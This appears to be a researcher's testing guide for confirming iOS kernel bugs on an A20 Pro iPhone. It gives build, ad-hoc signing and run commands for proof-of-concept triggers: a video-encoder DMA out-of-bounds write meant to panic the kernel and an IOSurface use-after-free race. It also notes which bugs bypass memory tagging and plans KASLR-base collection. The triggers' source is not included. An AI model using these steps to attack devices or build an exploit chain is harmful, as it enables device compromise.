# iPhone Duo Testing Guide — A20 Pro / iOS 27.1

## Target
- iPhone Duo (iPhone19,4 / V68AP), A20 Pro (T8160), iOS 27.1 (24A94425)
- Mac server at 192.168.1.155
- Connection: USB (via pymobiledevice3) or WiFi

## MIE Considerations

The A20 Pro has MIE (Memory Integrity Enforcement) always-on:
- Traditional heap OOB writes (Brotli, IOSurface) may be BLOCKED
- DMA-based bugs (AVEVideoEncoder, SmartIO) BYPASS MIE
- Data-only attacks within allocation boundaries BYPASS MIE

## Test Order (Priority for A20)

### Test 1: AVEVideoEncoder OOB (CVE-2026-112705) — PRIMARY

This is the most important test. The OOB write goes through DART DMA,
which bypasses MIE entirely.

```bash
# On Mac:
cd poc/ave
xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
    -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
    -framework CoreFoundation -o ave_oob_trigger ave_oob_trigger.c

# Sign
cat > /tmp/ent.plist << 'ENTEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>platform-application</key><true/>
</dict>
</plist>
ENTEOF
codesign -f -s - --entitlements /tmp/ent.plist ave_oob_trigger

# Deploy to iPhone Duo via USB
pymobiledevice3 developer debugserver start-server
# ... or use Xcode's device organizer

# Step 1: Run info mode (safe, no encode)
./ave_oob_trigger info

# Step 2: Run guard mode (safe encode, should not crash)
./ave_oob_trigger guard

# Step 3: Run temporal trigger (WILL PANIC if vulnerable)
# BACK UP DEVICE FIRST
./ave_oob_trigger temporal

# Step 4: Run resolution trigger (WILL PANIC if vulnerable)
# BACK UP DEVICE FIRST
./ave_oob_trigger resolution
```

**Expected outcomes:**
- "EncodeFrame returned: 0" → bug may be patched or device not vulnerable
- "SetProperty returned error" → iOS rejected the parameter (patched path)
- Kernel panic + reboot → VULNERABILITY CONFIRMED on A20
- Panic signature: `dart-ave` PTE-invalid write fault

**After panic, collect:**
- Crash logs: `pymobiledevice3 crash ls` and `pymobiledevice3 crash pull`
- Look for: fault address, register dump, backtrace through AppleAVE2

### Test 2: Collect MIE Crash Logs from Brotli Test

We already triggered an MIE fault during the Brotli heap spray test.
Pull the crash logs to understand the fault details.

```bash
# Via USB:
pymobiledevice3 crash ls | grep -i "WebKit\|brotli\|mie\|tag"
pymobiledevice3 crash pull /path/to/crash.ips ./crash-logs/
```

**What to look for:**
- Fault type (tag mismatch, synchronous abort)
- Faulting address and tag values
- Which process crashed (WebKit.Networking)
- MIE-specific fields in the crash report

### Test 3: Device Kernelcache Extraction

Extract the kernelcache to analyze:
- AVE driver internals and DART mapping layout
- SmartIO firmware (verify 0 PAC on A20)
- _zalloc_ro_mut code path (is CVE-2026-28952 patched?)

```bash
# Download IPSW for iPhone19,4 iOS 27.1
# Extract from device via pymobiledevice3:
pymobiledevice3 restore download --device iPhone19,4 --version 27.1

# Or extract kernelcache directly:
pymobiledevice3 developer kmutil inspect
```

### Test 4: IOSurface Race (Probabilistic Under MIE)

The IOSurface race (CVE-2026-112477) may work with ~1/16 success rate
under MIE due to probabilistic tag reuse.

```bash
# On Mac:
cd poc/iosurface
xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
    -framework IOKit -framework IOSurface -framework CoreFoundation \
    -lpthread -o iosurface_race iosurface_race.c

codesign -f -s - --entitlements /tmp/ent.plist iosurface_race
```

**MIE behavior:** Each UAF attempt has a 1/16 chance of tag match.
Failed attempts cause synchronous faults (may panic). Average ~16
attempts needed. Use `info` mode first to verify IOSurface access.

## Critical Information Needed

### From Test 1 (AVE OOB):
- Did the kernel panic? What was the panic signature?
- Was it `dart-ave` PTE-invalid or a different fault?
- Fault address — how far past the DART mapping?
- Did the guard (16384x16384) pass safely?
- Did the temporal layer trigger panic differently?

### From Test 2 (MIE Crash Logs):
- MIE fault type and tag values
- Faulting instruction and address
- WebKit.Networking process crash details

### From Test 3 (Kernelcache):
- SmartIO firmware PAC instruction count on A20
- _zalloc_ro_mut code — presence of CVE-2026-28952 fix
- AVE driver DART mapping configuration
- KASLR slide and kernel base

## USB Setup (pymobiledevice3)

```bash
# Install pymobiledevice3
pip3 install pymobiledevice3

# Verify device connection
pymobiledevice3 usbmux list

# Enable developer mode (may need device passcode)
pymobiledevice3 amfi developer-mode enable

# Start debug server
pymobiledevice3 developer debugserver start-server

# List crash reports
pymobiledevice3 crash ls

# Pull specific crash report
pymobiledevice3 crash pull <crash-name> ./
```
